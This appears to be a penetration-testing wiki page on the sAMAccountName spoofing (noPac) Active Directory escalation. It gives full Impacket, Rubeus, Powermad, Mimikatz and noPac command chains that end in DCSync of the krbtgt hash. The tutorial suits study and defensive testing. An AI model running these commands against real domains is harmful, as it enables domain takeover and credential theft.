---
description: CVE-2021-42278 and CVE-2021-42287
---

# sAMAccountName spoofing

## Theory

In November 2021, two vulnerabilities caught the attention of many security researchers as they could allow domain escalation from a standard user.

### CVE-2021-42278 - Name impersonation

Computer accounts should have a trailing `$` in their name (i.e. `sAMAccountName` attribute) but no validation process existed to make sure of it. Abused in combination with CVE-2021-42287, it allowed attackers to impersonate domain controller accounts.

### CVE-2021-42287 - KDC bamboozling

When requesting a Service Ticket, presenting a TGT is required first. When the service ticket is asked for is not found by the KDC, the KDC automatically searches again with a trailing `$`. What happens is that if a TGT is obtained for `bob`, and the `bob` user gets removed, using that TGT to request a service ticket for another user to himself (S4U2self) will result in the KDC looking for `bob$` in AD. If the domain controller account `bob$` exists, then `bob` (the user) just obtained a service ticket for `bob$` (the domain controller account) as any other user :exploding\_head:.

{% hint style="success" %}
As Elad Shamir said in his article [Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#solving-a-sensitive-problem), "S4U2Self works for a user marked as sensitive for delegation and a member of the Protected Users group".
{% endhint %}

## Practice

### Machine Account

The ability to edit a machine account's `sAMAccountName` and `servicePrincipalName` attributes is a requirement to the attack chain. The easiest way this can be achieved is by creating a computer account (e.g. by leveraging the [MachineAccountQuota](../domain-settings/machineaccountquota.md) domain-level attribute if it's greater than 0). The creator of the new machine account has enough privileges to edit its attributes. Alternatively, taking control over the owner/creator of a computer account should do the job.

The attack can then be conducted as follows.

1. Clear the controlled machine account `servicePrincipalName` attribute of any value that points to its name (e.g. `host/machine.domain.local`, `RestrictedKrbHost/machine.domain.local`)
2. Change the controlled machine account `sAMAccountName` to a Domain Controller's name without the trailing `$` -> [CVE-2021-42278](samaccountname-spoofing.md#cve-2021-42278-name-impersonation)
3. Request a TGT for the controlled machine account
4. Reset the controlled machine account `sAMAccountName` to its old value (or anything else different than the Domain Controller's name without the trailing `$`)
5. Request a service ticket with S4U2self by presenting the TGT obtained before -> [CVE-2021-42287](samaccountname-spoofing.md#cve-2021-42287-kdc-lookup)
6. Get access to the domain controller (i.e. [DCSync](../credentials/dumping/dcsync.md))

{% hint style="warning" %}
Some of the tools and features that allow exploitation of these vulnerabilities are still in development

* Impacket's getST: [https://github.com/SecureAuthCorp/impacket/pull/1202](https://github.com/SecureAuthCorp/impacket/pull/1202)
* Impacket's renameMachine: [https://github.com/SecureAuthCorp/impacket/pull/1224](https://github.com/SecureAuthCorp/impacket/pull/1224)
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
On UNIX-like systems, the steps mentioned above can be conducted with

* [krbelayx](https://github.com/dirkjanm/krbrelayx)'s (Python) addspn script for the manipulation of the computer's SPNs
* [Impacket](https://github.com/SecureAuthCorp/impacket)'s (Python) scripts (addcomputer, renameMachine, getTGT, getST, secretsdump) for all the other operations

```bash
# 0. create a computer account
addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'

# 1. clear its SPNs
addspn.py --clear -t 'ControlledComputer$' -u 'domain\user' -p 'password' 'DomainController.domain.local'

# 2. rename the computer (computer -> DC)
renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'

# 3. obtain a TGT
getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'

# 4. reset the computer name
renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'

# 5. obtain a service ticket with S4U2self by presenting the previous TGT
KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -altservice 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'

# 6. DCSync by presenting the service ticket
KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'
```

[noPac.py](https://github.com/Ridter/noPac) (Python) is an automated alternative that can be used to scan and abuse unpatched targets from a UNIX-like environnment.

```bash
scanner.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP
noPac.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP --impersonate Administrator -dump
```

{% hint style="success" %}
When using [Impacket](https://github.com/SecureAuthCorp/impacket)'s addcomputer script for the creation of a computer account, the "SAMR" method is used by default (instead of the LDAPS one). At the time of writing (10th of December, 2021), the SAMR method creates the account without SPNs, which allows to skip step #1.
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
On Windows systems, the steps mentioned above can be conducted with

* [PowerMad](https://github.com/Kevin-Robertson/Powermad/)'s (PowerShell) `New-MachineAccount` and `Set-MachineAccountAttribute` functions for the creation and manipulation of a computer account
* with [Rubeus](https://github.com/GhostPack/Rubeus) (C#) for the requests of Kerberos TGT and Service Ticket
* with [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) for the [DCSync](../credentials/dumping/dcsync.md) operation with [`lsadump::dcsync`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync)``

```powershell
# 0. create a computer account
$password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose

# 1. clear its SPNs
Set-DomainObject -Identity 'ControlledComputer$' -Clear 'serviceprincipalname' -Verbose

# 2. rename the computer (computer -> DC)
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose

# 3. obtain a TGT
Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap

# 4. reset the computer name
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose

# 5. obtain a service ticket with S4U2self by presenting the previous TGT
Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]

# 6. DCSync
(mimikatz) lsadump::dcsync /domain:domain.local /kdc:DomainController.domain.local /user:krbtgt 
```

[noPac](https://github.com/cube0x0/noPac) (C#) is an automated alternative that can be used to scan and abuse unpatched targets.

```powershell
noPac.exe scan -domain domain.local -user "lowpriv" -pass "lowpriv"
noPac.exe -domain mcafeelab.local -user "lowpriv" -pass "lowpriv" /dc dc.domain.local /mAccount pillemann11 /mPassword pilleman11 /service ldaps /ptt /impersonate Administrator
(mimikatz) lsadump::dcsync /domain:mcafeelab.local /all
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
In the screenshot below, the `-spn` argument is used in the `getST.py` command. The option is to be replaced with `-altservice`.
{% endhint %}

![](<../../../.gitbook/assets/samaccountname spoofing.png>)

### User account

An alternative to using computer accounts is to have enough permissions against a user account (cf. [Access Controls abuse](../dacl/)) to edit its `sAMAccountName` attribute (i.e. `WriteProperty` on the attribute, or on the « general information » or « public information » property sets, or `GenericWrite`, or `GenericAll`).

This attack path also requires knowledge of the user account password or hash (to obtain a TGT), which can be obtained (or set) in many ways (e.g. [Targeted Kerberoasting](../dacl/targeted-kerberoasting.md), [Shadow Credentials](shadow-credentials.md), [Forced Password Change](../dacl/forcechangepassword.md)).

Appart from the computer account creation and SPNs manipulation, the exploitation steps are the same as with a [machine account](samaccountname-spoofing.md#machine-account). If the account has SPNs that point to its name, they will have to be removed for the renaming operation to work.

## Resources

{% embed url="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html" %}

{% embed url="https://exploit.ph/more-samaccountname-impersonation.html" %}

{% embed url="https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing" %}

{% embed url="https://twitter.com/snovvcrash/status/1471829627765239816" %}
sAMAccountName exploitation through assembly execution
{% endembed %}
